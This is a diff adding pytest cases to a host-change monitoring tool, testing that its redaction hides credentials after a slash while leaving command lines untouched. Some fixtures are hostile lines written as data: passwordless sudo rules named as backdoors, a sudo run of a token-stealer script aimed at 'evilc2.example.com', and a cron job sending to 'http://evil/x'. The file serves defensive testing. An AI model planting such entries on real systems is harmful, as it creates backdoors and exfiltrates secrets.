@@ -1349,3 +1349,32 @@ def test_changed_persistence_item_is_escalated_everywhere(monkeypatch):
     c = snap(collectors={"launch_items": {"nginx.service": "enabled [bbbb]"}})
     f = next(x for x in since.build_findings(b, c) if x["category"] == "launch_items")
     assert f["action"] == "changed" and f["level"] >= since.ORANGE
+
+
+# The path-component exemption (`/`-preceded key = a filename, not an assignment target) leaked
+# real credentials until it was narrowed to WHITESPACE separators only. The suite passed WITH the
+# leak because it had no case of this shape — a '/' immediately before a credential key.
+@pytest.mark.parametrize("line", [
+    "+//registry.npmjs.org/_authToken=SECRETVAL12",     # a genuine .npmrc spelling
+    "+//npm.pkg.github.com/_password=SECRETVAL12",
+    "+https://host/api_key=SECRETVAL12",
+    "+curl -d /v1/token=SECRETVAL12 https://x",
+    "+/etc/foo/password=SECRETVAL12",
+    "+source /opt/x/secret=SECRETVAL12",
+    "+PATH=/usr/bin:/x/token=SECRETVAL12",
+])
+def test_slash_preceded_assignment_still_redacts(line):
+    assert "SECRETVAL12" not in since.redact(line)
+    for marker in ("", "-"):
+        assert "SECRETVAL12" not in since.redact(marker + line[1:])
+
+
+@pytest.mark.parametrize("line", [
+    "+deva ALL=(ALL) NOPASSWD: /usr/bin/passwd backdoor2026",
+    "+deva ALL=(ALL) NOPASSWD: /usr/sbin/chpasswd attacker99",
+    "+deva ALL=(ALL) NOPASSWD: /bin/bash /tmp/token_stealer.sh evilc2.example.com",
+    "+*/5 * * * * /usr/local/bin/passwd_sync.sh --dest http://evil/x",
+])
+def test_slash_preceded_command_still_shown(line):
+    """What the exemption exists for: a command basename is not a credential key."""
+    assert since.redact(line) == line
